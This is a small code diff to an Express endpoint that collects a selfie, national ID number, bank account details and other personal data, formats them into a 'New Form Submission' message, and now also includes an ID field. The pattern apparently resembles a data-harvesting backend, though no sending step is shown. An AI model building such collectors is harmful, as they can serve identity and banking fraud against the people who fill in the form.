@@ -111,12 +111,13 @@ app.post('/api/data', upload.single('selfie'), async (req, res) => {
     console.log('Request body:', req.body);
     console.log('Request file:', req.file);
     
-        const {name, gender, dob, email, employ, phone, marital, city, state, address, lga, nin, bankName, accountNumber, accountName} = req.body;
+        const {id, name, gender, dob, email, employ, phone, marital, city, state, address, lga, nin, bankName, accountNumber, accountName} = req.body;
         const selfieFile = req.file;
 
 const lines = ['📋 <b>New Form Submission</b>'];
     
 if (name) lines.push(`<b>Name:</b> ${name}`);
+if (id) lines.push(`<b>ID:</b> ${id}`);
 if (gender) lines.push(`<b>Gender:</b> ${gender}`);
 if (dob) lines.push(`<b>Date of Birth:</b> ${dob}`);
 if (email) lines.push(`<b>Email:</b> ${email}`);
